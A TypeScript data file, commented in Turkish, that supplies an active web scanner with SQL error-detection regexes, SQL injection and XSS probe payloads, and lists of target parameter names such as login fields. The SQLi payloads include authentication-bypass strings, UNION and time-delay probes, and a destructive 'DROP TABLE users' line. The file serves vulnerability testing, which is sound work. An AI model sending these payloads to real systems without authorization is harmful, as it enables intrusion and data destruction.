/**
 * SQLi ve XSS payload + parametre sözlükleri.
 * Aktif tarayıcı yalnızca veri olarak okur; davranışı `localActiveScanner.ts` belirler.
 */

// SQL hata kalıpları — çok sayıda veritabanı motorunu kapsar.
export const SQL_ERROR_PATTERNS: RegExp[] = [
  /sql syntax/i,
  /mysql_fetch/i,
  /ORA-\d{4,5}/,
  /unterminated quoted string/i,
  /sqlite_error/i,
  /odbc driver/i,
  /pg_query\(\)/i,
  /division by zero/i,
  /supplied argument is not a valid MySQL/i,
  /com\.mysql\.jdbc\.exceptions/i,
  /System\.Data\.SqlClient/i,
  /Microsoft OLE DB Provider for SQL Server/i,
  /Unclosed quotation mark after the character string/i,
  /quoted string not properly terminated/i,
];

// Hem hata hem UNION tabanlı SQLi yükleri — MySQL, SQL Server, Oracle
export const SQLI_PAYLOADS: string[] = [
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "admin' OR '1'='1",
  "\" OR \"1\"=\"1",
  "1' ORDER BY 1--",
  "1 UNION SELECT NULL--",
  "1' UNION SELECT NULL,NULL--",
  "'; DROP TABLE users--",
  "' AND 1=0 UNION SELECT NULL,NULL,NULL--",
  "1; WAITFOR DELAY '0:0:3'--",
  "' OR ''='",
];

// GET ile test edilecek yaygın parametre adları — login formları dahil (admin/veritabanı erişimi odaklı)
export const SQLI_GET_PARAMS: string[] = [
  "id",
  "user",
  "username",
  "search",
  "q",
  "query",
  "page",
  "cat",
  "category",
  "item",
  "Email",
  "Parola",
  "UserName",
  "Password",
];

// POST ile SQLi test edilecek login/veritabanı odaklı parametreler
export const SQLI_POST_PARAMS: string[] = [
  "Email",
  "Parola",
  "UserName",
  "Password",
  "email",
  "password",
  "username",
  "id",
  "user",
  "search",
  "q",
  "query",
];

export const XSS_MARKER = "scanner_xss_probe_9x7z";

// XSS yükleri — farklı bağlamlara göre çeşitlendirilmiş
export const XSS_PAYLOADS: string[] = [
  `<${XSS_MARKER}>`,
  `"><${XSS_MARKER}>`,
  `'><${XSS_MARKER}>`,
  `javascript:${XSS_MARKER}`,
];

export const XSS_PARAMS: string[] = [
  "q",
  "search",
  "query",
  "name",
  "input",
  "msg",
  "comment",
  "title",
  "text",
];
